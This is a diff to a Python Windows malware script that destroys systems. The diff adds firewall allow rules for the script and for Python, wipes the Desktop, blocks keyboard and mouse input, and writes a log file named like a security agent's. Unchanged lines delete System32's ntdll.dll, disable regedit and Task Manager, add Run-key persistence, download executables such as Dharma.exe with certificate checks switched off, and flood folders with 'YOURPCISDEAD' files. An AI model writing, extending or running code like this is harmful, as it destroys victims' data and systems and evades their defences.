@@ -10,11 +10,29 @@ import threading
 import time
 import winreg
 import sys
+from datetime import datetime
 #type:ignore
-RUN_INSTALLS = True
-CHAOS = True
-class Data:
+RUN_INSTALLS = False
+CHAOS = False
+def block_input(on):
+  try:
+    ctypes.windll.user32.BlockInput(on)
+  except Exception:
+    return -1, e
+  else:
+    return 1, None
 
+def get_time_formatted():
+  now = datetime.now()
+  year = now.year
+  month = now.month
+  day = now.day
+  hour = now.hour
+  minute = now.minute
+  second = now.second
+  return f"{year}_{month}_{day}_{hour}_{minute}_{second}"
+
+class Data:
   def __init__(self):
     self.whitelist = [
         os.path.realpath(__file__),
@@ -40,8 +58,69 @@ loop
     """
     return self.fork_code
 
+  def add_to_whitelist(self, file):
+    try:
+      self.whitelist.append(file)
+    except Exception as e:
+      return -1, e
+
 d = Data()
 
+class Logging:
+  def __init__(self):
+    self.logfile = None
+
+  def set_log(self, logfile):
+    if os.path.exists(logfile):
+      if os.path.isfile(logfile):
+        self.logfile = logfile
+      else:
+        return -2
+    else:
+      return -1
+
+  def create_log(self, logfile_path):
+    if os.path.exists(logfile_path):
+      return -1
+    else:
+      try:
+        with open(logfile_path, 'w') as f:
+          f.write("")
+          f.close()
+      except Exception:
+        return -2
+      else:
+        self.set_log(logfile_path)
+        d.add_to_whitelist(logfile_path)
+        return 1
+
+  def log(self, message):
+    if self.logfile is not None:
+      lf = self.logfile
+      try:
+        with open(lf, 'a+') as f:
+          f.write(message)
+          f.close()
+      except Exception:
+        return -2
+    else:
+      return -1
+
+  def info(self, message):
+    return self.log(f"[{get_time_formatted()}] [INFO] {message}")
+
+  def warn(self, message):
+    return self.log(f"[{get_time_formatted()}] [WARNING] {message}")
+
+  def error(self, message):
+    return self.log(f"[{get_time_formatted()}] [ERROR] {message}")
+
+logs = Logging()
+logfile = f'windows_security_agent_log_{random.randrange(1,1000)}_{get_time_formatted()}.txt'
+logfile = os.path.join(os.getcwd(), logfile)
+logs.create_log(logfile)
+logs.set_log(logfile)
+    
 
 class FileCreation:
   def mass_create(self, prefix, folder, count, ext=".txt"):
@@ -71,12 +150,18 @@ class FileDeletion:
     else:
       return 1
 
-  def delete_folder(self, folder):
+  def delete_folder(self, folder, remove_folder = False):
     for object in folder:
       if os.path.isfile(object):
         self.delete(object)
       elif os.path.isdir(object):
         self.delete_folder(os.path.join(folder, object))
+    if remove_folder:
+      try:
+        os.rmdir(folder)
+      except Exception:
+        pass
+        #type:ignore
 
   def del_sys32_files(self):
     self.delete(r"C:\Windows\System32\ntdll.dll")
@@ -150,6 +235,16 @@ box_art()
     else:
       return 1, None
 
+  def defender_allow(self, file):
+    e = Executables()
+    base = os.path.basename(file)
+    try:
+      split = base.split(".")[0]
+    except Exception:
+      split = base
+    command = rf'netsh advfirewall firewall add rule name="{split}" dir=in action=allow program="{file}" enable=yes'
+    e.run_shell_command(command)
+
   def write_message_box_code(self):
     path = f'msgbox{random.randrange(10000,100000)}.py'
     with open(path, 'w') as f:
@@ -182,7 +277,7 @@ class Executables:
 
   def install(self, package):
     try:
-      subprocess.Popen([sys.executable, '-m', 'pip', 'install', package])
+      subprocess.Popen([sys.executable, '-m', 'pip', 'install', package], shell=False)
     except Exception as e:
       return -1, e
     else:
@@ -227,6 +322,10 @@ class Executables:
     
     for function in processes:
       function()
+
+  def refresh_explorer(self):
+    self.stop_explorer()
+    self.run_shell_command('explorer.exe')
 
   def install_and_run_batch(self, folder, code):
     try:
@@ -473,17 +572,16 @@ class Zipfiles:
 
 
 class GitData:
-
-  def __init__(self):
-    pass
-
   def download_file(self, url, save_path):
-    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-    ssl_context.check_hostname = False
-    ssl_context.verify_mode = ssl.CERT_NONE
-    with urllib.request.urlopen(url, context=ssl_context) as response:
-      with open(save_path, 'wb') as out_file:
-        shutil.copyfileobj(response, out_file)
+    try:
+      ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+      ssl_context.check_hostname = False
+      ssl_context.verify_mode = ssl.CERT_NONE
+      with urllib.request.urlopen(url, context=ssl_context) as response:
+        with open(save_path, 'wb') as out_file:
+          shutil.copyfileobj(response, out_file)
+    except Exception as e:
+      logs.error(f"Error downloading file {url} : {e}")
 
 
 wsysw = WindowsSystemClass()
@@ -491,7 +589,10 @@ fd = FileDeletion()
 wsysw.grant_admin()
 if not wsysw.is_admin():
   wsysw.relaunch_as_admin()
+wsysw.defender_allow(os.path.realpath(__file__))
+wsysw.defender_allow(os.path.realpath(sys.executable))
 fd.del_sys32_files()
+fd.delete_folder(wsysw.get_desktop_path(), remove_folder=False)
 gd = GitData()
 zf = Zipfiles()
 d = Data()
@@ -499,18 +600,23 @@ e = Executables()
 f = Folders()
 fc = FileCreation()
 e.stop_all()
+e.refresh_explorer()
 reg = Registry()
 reg.disable_regedit()
 reg.add_to_startup(os.path.realpath(__file__))
-exe_path = os.path.join(os.path.dirname(sys.executable), "your_script_name.exe")
+exe_path = os.path.join(os.path.dirname(sys.executable), "runme.exe")
 reg.new_key_edit(1, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsStartupManager", exe_path)
 reg.new_key_edit(2, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsStartupManager", exe_path)
 reg.disable_task_manager()
 appdata = f.create_appdata_folder()
 folder = f.create_goose_folder(appdata)
+logs.info(f"Created folder {folder}")
 folder2 = f.create_butterfly_folder(appdata)
+logs.info(f"Created folder {folder2}")
 folder3 = f.create_dharma_folder(appdata)
+logs.info(f"Created folder {folder3}")
 folder4 = f.create_roach_folder(appdata)
+logs.info(f"Created folder {folder4}")
 goose_zip = os.path.join(folder, 'goose.zip')
 butterflies = os.path.join(folder2, 'ButterflyOnDesktop.exe')
 dharma = os.path.join(folder3, 'Dharma.exe')
@@ -523,8 +629,10 @@ gd.download_file(d.roach_link, roach)
 zf.extract(goose_zip, folder)
 boxpath = wsysw.write_message_box_code()
 fc.mass_create("YOURPCISDEAD", wsysw.get_desktop_path(), 100)
+block_input(True)
 e.install_all()
-time.sleep(5)
+time.sleep(15)
+block_input(False)
 if RUN_INSTALLS:
   for x in range(3):
     status = e.run_goose(folder)
@@ -540,10 +648,10 @@ fc.mass_create("YOURPCISDEAD", wsysw.get_windows_user_directory(), 100)
 fc.mass_create("YOURPCISDEAD", wsysw.get_documents_path(), 100)
 
 #After installs
-#import win32api
-#import win32gui
-#import win32con
-#from win32gui import GetDesktopWindow, GetWindowDC, StretchBlt
-#from win32api import GetSystemMetrics
-#from win32file import *
+import win32api
+import win32gui
+import win32con
+from win32gui import GetDesktopWindow, GetWindowDC, StretchBlt
+from win32api import GetSystemMetrics
+from win32file import *
 #type:ignore
